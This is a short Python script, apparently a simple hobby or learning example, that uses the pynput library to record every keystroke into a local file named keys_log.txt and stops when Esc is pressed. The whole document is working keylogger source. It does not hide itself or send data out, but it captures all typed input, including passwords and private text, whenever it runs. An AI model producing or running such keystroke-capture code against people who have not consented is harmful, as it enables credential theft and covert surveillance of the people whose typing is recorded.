from pynput import keyboard

#Obtains the keys pressed and saves in keys_log.txt file
def on_key_press(key):
    try:
        with open("keys_log.txt", "a") as log:
            log.write(key.char)
    except AttributeError:
        with open("keys_log.txt", "a") as log:
            log.write(f"[{key}]")

# Program termination when user clicks escape keyboard key
def on_key_release(key):
    if key == keyboard.Key.esc:
        return False 

#program to start listening key strokesnoe
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
